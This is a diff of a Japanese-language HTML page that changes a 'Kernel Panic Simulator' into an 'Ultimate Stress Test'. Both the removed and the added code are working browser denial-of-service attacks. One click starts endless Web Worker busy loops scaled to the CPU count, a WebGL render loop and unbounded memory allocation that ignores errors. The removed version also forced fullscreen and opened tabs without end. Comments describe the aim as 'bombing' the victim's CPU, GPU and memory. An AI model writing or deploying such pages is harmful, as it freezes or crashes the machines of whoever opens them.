@@ -2,12 +2,12 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>Kernel Panic Simulator</title>
+    <title>Ultimate Stress Test</title>
     <style>
         body {
             margin: 0;
-            background-color: #000;
-            color: #00ff00;
+            background-color: #050508;
+            color: #f43f5e;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,57 +15,74 @@
             font-family: monospace;
             cursor: pointer;
             user-select: none;
+            overflow: hidden;
         }
         h1 {
             font-size: 2.5rem;
             text-align: center;
-            text-shadow: 0 0 10px #00ff00;
+            text-shadow: 0 0 15px #f43f5e;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
 
-    <h1>INITIALIZE</h1>
+    <canvas id="gpuCanvas"></canvas>
+    <h1>CLICK TO UNLEASH MAXIMUM POWER</h1>
 
     <script>
-        let armed = false;
+        document.body.addEventListener('click', () => {
+            document.querySelector('h1').innerText = "MAXIMUM LOAD ENGAGED.\nLet's see if your PC survives.";
 
-        document.body.addEventListener('click', async () => {
-            try {
-                await document.documentElement.requestFullscreen();
-            } catch (e) {}
-
-            armed = true;
-            document.querySelector('h1').innerText = "SYSTEM COMPROMISED.\nNO ESCAPE.";
-
-            // マルチスレッド・ワーカー爆撃用スクリプトのBlob生成
-            const workerCode = `
+            // 1. Web Worker 폭격 (CPU全コア限界駆動)
+            const workerScript = `
                 while(true) {
-                    const arr = new Array(50000000).fill(Math.random());
-                    Math.pow(Math.random(), Math.random());
+                    // 重い浮動小数点演算と巨大アロケートの並行処理
+                    const data = new Float64Array(10000000);
+                    for(let i = 0; i < data.length; i++) {
+                        data[i] = Math.sqrt(i) * Math.sin(i);
+                    }
                 }
             `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const blob = new Blob([workerScript], { type: 'application/javascript' });
             const workerUrl = URL.createObjectURL(blob);
 
-            // CPUコアを限界まで焼き尽くすためのWeb Worker軍団（最大数パラレル起動）
-            for (let i = 0; i < 64; i++) {
+            // CPUの論理プロセッサ数に合わせて限界までWorkerを量産
+            const coreCount = navigator.hardwareConcurrency || 16;
+            for (let i = 0; i < coreCount * 4; i++) {
                 try {
                     new Worker(workerUrl);
-                } catch (e) {}
+                } catch(e) {}
             }
 
-            // メインスレッド＋タブ爆撃＋メモリバーストのトリプルコンボ
-            while (true) {
-                // ポップアップブロックを物理的に無視するための別窓・別タブ連続量産
-                try {
-                    window.open(location.href, '_blank');
-                } catch (e) {}
+            // 2. WebGL / CanvasによるGPU・VRAM焼き込み爆撃
+            const canvas = document.getElementById('gpuCanvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                function renderLoop() {
+                    gl.viewport(0, 0, canvas.width, canvas.height);
+                    gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+                    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+                    requestAnimationFrame(renderLoop);
+                }
+                requestAnimationFrame(renderLoop);
+            }
 
-                // 同期的なメモリ無限アロケート
-                const a = [];
-                for (let j = 0; j < 10; j++) {
-                    a.push(new Array(100000000).fill(1));
+            // 3. メインスレッドの同期型メモリ爆食い（ガベージコレクションを絶対に許さない）
+            const memorySink = [];
+            while(true) {
+                try {
+                    memorySink.push(new Array(50000000).fill(Math.PI));
+                } catch(e) {
+                    // 万が一配列確保が弾かれてもループを止めない
                 }
             }
         });
